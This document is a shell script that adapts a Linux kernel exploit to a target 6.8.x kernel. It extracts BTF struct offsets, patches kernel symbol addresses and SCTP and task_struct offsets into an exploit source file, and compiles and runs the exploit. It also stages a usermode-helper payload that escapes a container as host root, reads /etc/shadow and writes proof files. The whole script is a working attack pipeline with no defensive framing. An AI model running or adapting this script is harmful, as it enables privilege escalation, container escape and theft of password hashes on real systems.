#!/bin/sh
# adapt.sh — Extract BTF offsets, patch exploit for target kernel, compile, run
# No set -e: capture all errors gracefully

KVER=$(uname -r)
echo "=== ADAPT EXPLOIT FOR $KVER ==="

# Only run on 6.8.x kernels
case "$KVER" in
  6.8.*) echo "Target kernel matched" ;;
  *) echo "NOT a 6.8 kernel ($KVER), skipping exploit"; exit 0 ;;
esac

# 1. Extract BTF
echo "--- BTF EXTRACTION ---"
/btf_offsets /sys/kernel/btf/vmlinux > /tmp/btf.txt 2>&1
cat /tmp/btf.txt

# 2. Parse dynamic offsets from BTF full dump
echo "--- PARSING BTF OFFSETS ---"

# peer.active_path and peer.primary_path (absolute offsets in sctp_association)
# Use flag-based awk (busybox awk range with ^=== matches the start line too)
ASOC_AP=$(awk '/FULL DUMP: sctp_association/{f=1} f && /peer\.active_path:/{print $2;exit}' /tmp/btf.txt)
ASOC_PP=$(awk '/FULL DUMP: sctp_association/{f=1} f && /peer\.primary_path:/{print $2;exit}' /tmp/btf.txt)
ASOC_TAL=$(awk '/FULL DUMP: sctp_association/{f=1} f && /peer\.transport_addr_list:/{print $2;exit}' /tmp/btf.txt)

# task_struct.comm and task_struct.pid
TS_COMM=$(awk '/^--- task_struct/,/SIZEOF/{if($1=="comm:")print $2}' /tmp/btf.txt)
TS_PID=$(awk '/^--- task_struct/,/SIZEOF/{if($1=="pid:")print $2}' /tmp/btf.txt)

# sctp_af.sockaddr_len
AF_SLEN=$(awk '/^--- sctp_af/,/SIZEOF/{if($1=="sockaddr_len:")print $2}' /tmp/btf.txt)

# sctp_transport.state, srtt
T_STATE=$(awk '/^--- sctp_transport/,/SIZEOF/{if($1=="state:")print $2}' /tmp/btf.txt)
OFF_SRTT=$(awk '/^--- sctp_transport/,/SIZEOF/{if($1=="srtt:")print $2}' /tmp/btf.txt)

# sctp_association state from simple query (not full dump)
A_STATE=$(awk '/^--- sctp_association/,/SIZEOF/{if($1=="state:")print $2}' /tmp/btf.txt)

echo "ASOC_ACTIVE_PATH=$ASOC_AP ASOC_PRIMARY_PATH=$ASOC_PP ASOC_TRANSPORT_ADDR_LIST=$ASOC_TAL"
echo "TS_COMM=$TS_COMM TS_PID=$TS_PID AF_SLEN=$AF_SLEN T_STATE=$T_STATE OFF_SRTT=$OFF_SRTT A_STATE=$A_STATE"

# Validate critical values
for V in ASOC_AP ASOC_PP TS_COMM TS_PID; do
  eval VAL=\$$V
  if [ -z "$VAL" ] || [ "$VAL" = "0" ]; then
    echo "FATAL: $V not resolved from BTF"
    echo "=== BTF RAW OUTPUT ==="
    cat /tmp/btf.txt
    echo "=== ADAPT DONE (BTF failed) ==="
    exit 0
  fi
done

# 3. Patch exploit source
echo "--- PATCHING EXPLOIT ---"
cp /exploit_src.c /tmp/e.c

# --- Kernel symbols (6.8.0-136 System.map) ---
sed -i 's/0xffffffff81140d10ULL/0xffffffff81148750ULL/g' /tmp/e.c
sed -i 's/0xffffffff81321300ULL/0xffffffff8139c060ULL/g' /tmp/e.c
sed -i 's/0xffffffff82c4f1c0ULL/0xffffffff83687760ULL/g' /tmp/e.c
sed -i 's/0xffffffff82c4f260ULL/0xffffffff83687800ULL/g' /tmp/e.c
sed -i 's/0xffffffff82c570e0ULL/0xffffffff83691980ULL/g' /tmp/e.c
sed -i 's/0xffffffff82c56600ULL/0xffffffff836907f8ULL/g' /tmp/e.c
sed -i 's/0xffffffff8112a660ULL/0xffffffff8112e970ULL/g' /tmp/e.c
sed -i 's/0xffffffff8112a4c0ULL/0xffffffff8112e7a0ULL/g' /tmp/e.c
sed -i 's/0xffffffff8112a6c0ULL/0xffffffff8112ec10ULL/g' /tmp/e.c
sed -i 's/0xffffffff81e009a0ULL/0xffffffff82400950ULL/g' /tmp/e.c
sed -i 's/0xffffffff825d3b00ULL/0xffffffff82d49dc0ULL/g' /tmp/e.c

# PCPU_CURRENT
sed -i 's/PCPU_CURRENT *0x33b40/PCPU_CURRENT      0x341c0/' /tmp/e.c

# --- sctp_transport offsets ---
sed -i 's/^#define T_AF       192/#define T_AF       168/' /tmp/e.c
sed -i 's/^#define T_ASOC     200/#define T_ASOC     176/' /tmp/e.c
sed -i 's/^#define T_CWND     228/#define T_CWND     204/' /tmp/e.c
sed -i 's/^#define T_BURST    244/#define T_BURST    220/' /tmp/e.c
sed -i 's/^#define T_DST      248/#define T_DST      224/' /tmp/e.c
sed -i 's/^#define T_PATHMTU  360/#define T_PATHMTU  336/' /tmp/e.c
sed -i "s/^#define T_STATE    372/#define T_STATE    ${T_STATE:-348}/" /tmp/e.c
sed -i "s/^#define OFF_SRTT     224/#define OFF_SRTT     ${OFF_SRTT:-200}/" /tmp/e.c
sed -i 's/^#define OFF_CWND     228/#define OFF_CWND     204/' /tmp/e.c
sed -i 's/^#define OFF_PATHMTU  360/#define OFF_PATHMTU  336/' /tmp/e.c
sed -i "s/^#define OFF_STATE    372/#define OFF_STATE    ${T_STATE:-348}/" /tmp/e.c

# T2 variants
sed -i 's/^#define T2_AF 192/#define T2_AF 168/' /tmp/e.c
sed -i 's/^#define T2_ASOC 200/#define T2_ASOC 176/' /tmp/e.c
sed -i 's/^#define T2_BURST 244/#define T2_BURST 220/' /tmp/e.c
sed -i 's/^#define T2_DST 248/#define T2_DST 224/' /tmp/e.c
sed -i 's/^#define T2_PATHMTU 360/#define T2_PATHMTU 336/' /tmp/e.c
sed -i 's/^#define T2_PARAMFLAGS 364/#define T2_PARAMFLAGS 340/' /tmp/e.c

# sctp_packet (embedded at transport+576 for 6.8)
sed -i 's/^#define P_VTAG 724/#define P_VTAG 580/' /tmp/e.c
sed -i 's/^#define P_CHUNKLIST_NEXT 728/#define P_CHUNKLIST_NEXT 584/' /tmp/e.c
sed -i 's/^#define P_CHUNKLIST_PREV 736/#define P_CHUNKLIST_PREV 592/' /tmp/e.c
sed -i 's/^#define P_OVERHEAD 744/#define P_OVERHEAD 600/' /tmp/e.c
sed -i 's/^#define P_SIZE 752/#define P_SIZE 608/' /tmp/e.c
sed -i 's/^#define P_TRANSPORT 768/#define P_TRANSPORT 624/' /tmp/e.c
sed -i 's/^#define P_AUTH 776/#define P_AUTH 632/' /tmp/e.c
sed -i 's/^#define P_HAS_COOKIE 784/#define P_HAS_COOKIE 640/' /tmp/e.c
sed -i 's/^#define T2_SENDREADY 792/#define T2_SENDREADY 648/' /tmp/e.c

# --- sctp_association ---
sed -i 's/^#define A_ASSOCID_OFF 144/#define A_ASSOCID_OFF 128/' /tmp/e.c
sed -i 's/^#define A2_PMTU_PENDING 657/#define A2_PMTU_PENDING 641/' /tmp/e.c
sed -i 's/^#define A2_PATHMTU 660/#define A2_PATHMTU 644/' /tmp/e.c
sed -i 's/^#define A2_PARAMFLAGS 664/#define A2_PARAMFLAGS 648/' /tmp/e.c
sed -i "s/^#define A_STATE    592/#define A_STATE    ${A_STATE:-576}/" /tmp/e.c
sed -i 's/^#define A_PATHMTU  684/#define A_PATHMTU  644/' /tmp/e.c
sed -i 's/^#define A_TIMEOUTS 704/#define A_TIMEOUTS 688/' /tmp/e.c

# ASOC path offsets (from BTF at build time)
sed -i "s/^#define ASOC_ACTIVE_PATH  368/#define ASOC_ACTIVE_PATH  $ASOC_AP/" /tmp/e.c
sed -i "s/^#define ASOC_PRIMARY_PATH 328/#define ASOC_PRIMARY_PATH $ASOC_PP/" /tmp/e.c
# transport_addr_list.next hardcoded at asoc+304
sed -i "s/leak_ptr(asoc+304)/leak_ptr(asoc+$ASOC_TAL)/" /tmp/e.c

# --- pointer walk ---
sed -i 's/^#define TS_FILES          3728/#define TS_FILES          3104/' /tmp/e.c
sed -i 's/^#define SCTPSOCK_EP       1176/#define SCTPSOCK_EP       1008/' /tmp/e.c
sed -i 's/^#define EP_ASOCS          152/#define EP_ASOCS          136/' /tmp/e.c
sed -i 's/^#define ASOC_ASOCS        128/#define ASOC_ASOCS        112/' /tmp/e.c

# sctp_sock / sctp_pf
sed -i 's/^#define SK_PF 1152/#define SK_PF 984/' /tmp/e.c
sed -i 's/^#define SK_UDPPORT 1228/#define SK_UDPPORT 1060/' /tmp/e.c

# --- subprocess_info (shifted -16 for 6.8 kernel) ---
sed -i 's/^#define SI_COMPLETE   48/#define SI_COMPLETE   32/' /tmp/e.c
sed -i 's/^#define SI_PATH       56/#define SI_PATH       40/' /tmp/e.c
sed -i 's/^#define SI_ARGV       64/#define SI_ARGV       48/' /tmp/e.c
sed -i 's/^#define SI_ENVP       72/#define SI_ENVP       56/' /tmp/e.c
sed -i 's/^#define SI_WAIT       80/#define SI_WAIT       64/' /tmp/e.c
sed -i 's/^#define SI_RETVAL     84/#define SI_RETVAL     68/' /tmp/e.c
sed -i 's/^#define SI_INIT       88/#define SI_INIT       72/' /tmp/e.c
sed -i 's/^#define SI_CLEANUP    96/#define SI_CLEANUP    80/' /tmp/e.c
sed -i 's/^#define SI_DATA       104/#define SI_DATA       88/' /tmp/e.c

# --- UMH layout (must fit below T2_AF=168) ---
sed -i 's/^#define UMH_PATHSTR   112/#define UMH_PATHSTR   64/' /tmp/e.c
sed -i 's/^#define UMH_ARGV_ARR  160/#define UMH_ARGV_ARR  88/' /tmp/e.c
sed -i 's/^#define UMH_ENVP_ARR  176/#define UMH_ENVP_ARR  104/' /tmp/e.c

# task_struct.comm and .pid (hardcoded in code, not defines)
sed -i "s/cur+3656/cur+$TS_COMM/" /tmp/e.c
sed -i "s/cur+3664/cur+$((TS_COMM+8))/" /tmp/e.c
sed -i "s/cur+3152/cur+$TS_PID/" /tmp/e.c

# AF sockaddr_len in pgv_fill
if [ -n "$AF_SLEN" ]; then
  sed -i "s/(b21+180) = 16/(b21+$AF_SLEN) = 16/" /tmp/e.c
fi

# 4. Also handle 6.8.0-137 kernel symbols (round-robin)
case "$KVER" in
  6.8.0-137*)
    echo "Applying 6.8.0-137 symbol overrides..."
    # Download and extract System.map if different
    # For now assume same offsets (same source), only symbols might differ slightly
    # TODO: integrate 137 System.map
    ;;
esac

echo "--- COMPILING EXPLOIT ---"
if gcc -static -O2 -w -o /tmp/exploit /tmp/e.c 2>&1; then
  ls -la /tmp/exploit
  echo "--- COMPILATION OK ---"
else
  echo "COMPILATION FAILED (rc=$?)"
  gcc -static -O2 -o /tmp/exploit /tmp/e.c 2>&1 | tail -40
  echo "=== ADAPT DONE (compile failed) ==="
  exit 0
fi

# 5. Prepare UMH payload
echo "--- STAGING UMH PAYLOAD ---"
cat > /p <<'PAYLOAD'
#!/bin/sh
R="/proc/$$/root"
{
echo "[HOST-ROOT] id=$(id)"
echo "[HOST] hostname=$(hostname)"
echo "[HOST] kernel=$(uname -r)"
echo "[HOST] /etc/hostname=$(cat /etc/hostname 2>/dev/null)"
} > /tmp/umh_result 2>&1
cp /tmp/umh_result "$R/esc_ok" 2>/dev/null
head -2 /etc/shadow >> "$R/esc_ok" 2>/dev/null
echo "umh-escape-ok" > /UMH_ESCAPE_PROOF_ON_HOST 2>/dev/null
sync
PAYLOAD
chmod 755 /p

# 6. Run exploit (timeout 60s to prevent hang)
echo "=== RUNNING EXPLOIT ==="
timeout 60 /tmp/exploit 2>&1; RC=$?
echo "=== EXPLOIT EXIT CODE: $RC ==="

# 7. Check results
echo "--- POST-EXPLOIT CHECK ---"
for f in /esc_ok /tmp/umh_result /UMH_ESCAPE_PROOF_ON_HOST /tmp/escape_result; do
  if [ -f "$f" ]; then
    echo "=== $f ==="
    cat "$f"
  fi
done
echo "=== ADAPT DONE ==="
